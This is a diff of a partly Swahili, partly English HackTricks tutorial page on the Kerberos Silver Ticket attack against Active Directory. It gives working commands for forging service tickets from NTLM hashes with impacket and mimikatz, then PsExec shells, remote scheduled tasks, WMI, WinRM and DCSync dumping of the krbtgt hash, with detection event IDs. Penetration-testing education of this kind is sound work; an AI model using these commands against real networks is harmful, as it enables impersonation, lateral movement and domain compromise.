@@ -1,32 +1,33 @@
-# Tiketi ya Fedha
+# Silver Ticket
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Sawa tip**: **jiandikishe** kwa **Intigriti**, jukwaa la **bug bounty la malipo ya juu lililoanzishwa na wadukuzi, kwa wadukuzi**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata zawadi hadi **$100,000**!
+**Bug bounty tip**: **jiandikishe** kwa **Intigriti**, jukwaa la **bug bounty la kiwango cha juu lililotengenezwa na hackers, kwa hackers**! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na uanze kupata zawadi hadi **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
-## Tiketi ya Fedha
+## Silver ticket
 
-Shambulio la **Tiketi ya Fedha** linahusisha kutumia tiketi za huduma katika mazingira ya Active Directory (AD). Mbinu hii inategemea **kupata hash ya NTLM ya akaunti ya huduma**, kama vile akaunti ya kompyuta, kufanya tiketi ya Huduma ya Kutoa Tiketi (TGS). Kwa tiketi iliyodanganywa hivi, mshambuliaji anaweza kupata huduma maalum kwenye mtandao, **kujifanya kuwa mtumiaji yeyote**, kwa kawaida lengo likiwa ni kupata mamlaka ya usimamizi. Inasisitizwa kwamba kutumia funguo za AES kwa kufanya tiketi ni salama zaidi na inaweza kugunduliwa kidogo.
+Shambulio la **Silver Ticket** linahusisha unyakuzi wa tiketi za huduma katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata hash ya NTLM ya akaunti ya huduma**, kama akaunti ya kompyuta, ili kutunga tiketi ya Ticket Granting Service (TGS). Kwa tiketi hii iliyotungwa, mshambuliaji anaweza kufikia huduma maalum kwenye mtandao, **akijifanya kuwa mtumiaji yeyote**, kwa kawaida akilenga haki za usimamizi. Inasisitizwa kwamba kutumia funguo za AES kwa kutunga tiketi ni salama zaidi na ngumu kugundulika.
 
-Kwa kutengeneza tiketi, zana tofauti hutumiwa kulingana na mfumo wa uendeshaji:
+Kwa ajili ya kutunga tiketi, zana tofauti zinatumika kulingana na mfumo wa uendeshaji:
 
-### Kwenye Linux
+### On Linux
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -44,44 +45,52 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
-## Huduma Zinazopatikana
+The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
 
-| Aina ya Huduma                             | Tiketi za Fedha za Huduma                                                |
+## Available Services
+
+| Service Type                               | Service Silver Tickets                                                     |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
 | PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika baadhi ya matukio unaweza tu kuomba: WINRM</p> |
-| Kazi Zilizopangwa                          | HOST                                                                       |
-| Kushiriki Faili za Windows, pia psexec     | CIFS                                                                       |
-| Operesheni za LDAP, pamoja na DCSync       | LDAP                                                                       |
-| Zana za Usimamizi wa Seva ya Mbali ya Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Tiketi za Dhahabu                          | krbtgt                                                                     |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika matukio mengine unaweza tu kuuliza: WINRM</p> |
+| Scheduled Tasks                            | HOST                                                                       |
+| Windows File Share, also psexec            | CIFS                                                                       |
+| LDAP operations, included DCSync           | LDAP                                                                       |
+| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
+| Golden Tickets                             | krbtgt                                                                     |
 
-Kutumia **Rubeus** unaweza **kuomba zote** tiketi hizi kwa kutumia parameter:
+Using **Rubeus** you may **ask for all** these tickets using the parameter:
 
 * `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Matukio ya Tiketi za Fedha
+### Silver tickets Event IDs
 
-* 4624: Ingia kwenye Akaunti
-* 4634: Toka kwenye Akaunti
-* 4672: Ingia kama Msimamizi
+* 4624: Account Logon
+* 4634: Account Logoff
+* 4672: Admin Logon
 
-## Kutumia vibaya Tiketi za Huduma
+## Abusing Service tickets
 
-Katika mifano ifuatayo fikiria kuwa tiketi inapokelewa kwa kujifanya akaunti ya msimamizi.
+In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
 
 ### CIFS
 
-Kwa tiketi hii utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimefunuliwa) na kunakili faili kwenye sehemu ya mfumo wa mbali kwa kufanya kitu kama:
+With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-### MHUDUMA
+You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
 
-Kwa idhini hii unaweza kuzalisha kazi zilizopangwa kwenye kompyuta za mbali na kutekeleza amri za kupindukia:
+{% content-ref url="../lateral-movement/psexec-and-winexec.md" %}
+[psexec-and-winexec.md](../lateral-movement/psexec-and-winexec.md)
+{% endcontent-ref %}
+
+### HOST
+
+With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -93,9 +102,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-### MHUDUMA + RPCSS
+### HOST + RPCSS
 
-Kwa tiketi hizi unaweza **kutekeleza WMI kwenye mfumo wa mwathiriwa**:
+Kwa tiketi hizi unaweza **kutekeleza WMI katika mfumo wa mwathirika**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -107,33 +116,33 @@ wmic remote.computer.local list full /format:list
 ```
 Pata **maelezo zaidi kuhusu wmiexec** katika ukurasa ufuatao:
 
-{% content-ref url="../lateral-movement/wmicexec.md" %}
-[wmicexec.md](../lateral-movement/wmicexec.md)
+{% content-ref url="../lateral-movement/wmiexec.md" %}
+[wmiexec.md](../lateral-movement/wmiexec.md)
 {% endcontent-ref %}
 
 ### HOST + WSMAN (WINRM)
 
-Ukiwa na ufikiaji wa winrm kwenye kompyuta unaweza **kuipata** na hata kupata PowerShell:
+Kwa ufikiaji wa winrm juu ya kompyuta unaweza **kuipata** na hata kupata PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-Angalia ukurasa ufuatao kujifunza **njia zaidi za kuunganisha na mwenyeji wa mbali kwa kutumia winrm**:
+Check the following page to learn **njia zaidi za kuungana na mwenyeji wa mbali kwa kutumia winrm**:
 
 {% content-ref url="../lateral-movement/winrm.md" %}
 [winrm.md](../lateral-movement/winrm.md)
 {% endcontent-ref %}
 
 {% hint style="warning" %}
-Tafadhali kumbuka kwamba **winrm lazima iwe hai na isikilize** kwenye kompyuta ya mbali ili kuifikia.
+Note that **winrm lazima iwe hai na inasikiliza** kwenye kompyuta ya mbali ili kuweza kuipata.
 {% endhint %}
 
 ### LDAP
 
-Kwa haki hii unaweza kudumpisha database ya DC kwa kutumia **DCSync**:
+With this privilege you can dump the DC database using **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
-**Jifunze zaidi kuhusu DCSync** kwenye ukurasa ufuatao:
+**Jifunze zaidi kuhusu DCSync** katika ukurasa ufuatao:
 
 ## Marejeo
 
@@ -146,20 +155,21 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Siri ya tuzo ya mdudu**: **jiandikishe** kwa **Intigriti**, jukwaa la tuzo la mdudu la malipo lililoundwa na wadukuzi, kwa wadukuzi! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!
+**Usanidi wa bug bounty**: **jiandikishe** kwa **Intigriti**, jukwaa la **bug bounty la kiwango cha juu lililotengenezwa na hackers, kwa hackers**! Jiunge nasi katika [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata zawadi hadi **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
+{% hint style="success" %}
+Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
+* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
 
 </details>
+{% endhint %}
